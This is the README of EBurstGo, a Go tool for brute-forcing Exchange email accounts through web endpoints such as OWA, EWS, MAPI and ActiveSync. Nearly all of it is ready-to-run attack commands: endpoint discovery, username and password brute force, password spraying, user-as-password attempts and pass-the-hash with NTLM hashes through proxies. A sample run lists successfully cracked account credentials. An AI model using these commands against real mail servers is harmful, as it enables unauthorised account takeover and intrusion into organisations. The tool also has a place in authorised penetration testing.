# EBurstGo

Brute force email accounts using Exchange server web endpoints

Refactored using Go language based on the [grayddq/EBurst](https://github.com/grayddq/EBurst) project

Supported endpoints

```shell
/autodiscover
/owa/auth.owa # OWA & ECP
/ews
/mapi
/oab
/rpc
/Microsoft-Server-ActiveSync
/powershell
```

Note that the code in Releases may not be the latest

It is recommended to clone this project and then execute `goreleaser build --snapshot` to compile manually

## Usage

usage

```shell
Usage of ./EBurstGo:
  -check
    	check Exchange endpoints
  -delay int
    	delay between requests
  -domain string
    	AD domain
  -mode string
    	Exchange endpoint
  -nocolor
    	disable output color
  -o string
    	output file (default "result.txt")
  -pass string
    	password
  -passf string
    	password file
  -proxy string
    	socks/http(s) proxy
  -pth
    	PTH mode (Pass The Hash)
  -t int
    	number of goroutines (default 2)
  -url string
    	Exchange url
  -user string
    	username
  -user-as-pass
    	password is same as username
  -userf string
    	username file
  -userpassf string
    	user-pass file (user:pass)
  -v	show verbose info
```

check

```shell
$ ./EBurstGo -url https://192.168.30.11 -check
[*] checking exchange endpoints
[+] owa (/owa/auth.owa) exists
[+] powershell (/powershell) exists
[+] ecp (/owa/auth.owa) exists
[+] autodiscover (/autodiscover) exists
[+] mapi (/mapi) exists
[+] activesync (/Microsoft-Server-ActiveSync) exists
[+] oab (/oab) exists
[+] ews (/ews) exists
[+] rpc (/rpc) exists
```

brute

```shell
# By default, successful brute force accounts will be appended to result.txt

# Regular brute force
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -passf pass.txt -mode ews

# Account brute force
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -user Alice -passf pass.txt -mode ews

# Password spraying
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -pass 'Changeme123' -mode ews

# Support for user:pass format dictionary
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userpassf userpass.txt -mode ews

# Password is the same as username
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -user-as-pass -mode ews

# Pth brute force (pass.txt is NTLM Hash)
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -passf pass.txt -mode ews -pth

# Set socks/http(s) proxy
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -passf pass.txt -mode ews -socks socks5://127.0.0.1:1080
```

examples

```shell
$ ./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -passf pass.txt -mode ews
[*] using ews endpoint: https://192.168.30.11
[+] success: Administrator:abcd1234!@#$
[+] success: Alice:Alice123!
[+] success: Bob:Bob123!
[+] success: Marry:Marry123!
[*] costs: 3.031753209 s
```

## Todo

- After using NTLM authentication with a proxy for a period of time, connection refused appears. To be resolved (currently, there seems to be no good solution, only reducing the number of goroutines and adding delays to avoid it)  
- support `/powershell` endpoint (Kerberos authentication)
## License

Modified some code from the following repos

[Azure/go-ntlmssp](https://github.com/Azure/go-ntlmssp): Copyright (c) 2016 Microsoft The MIT License (MIT)

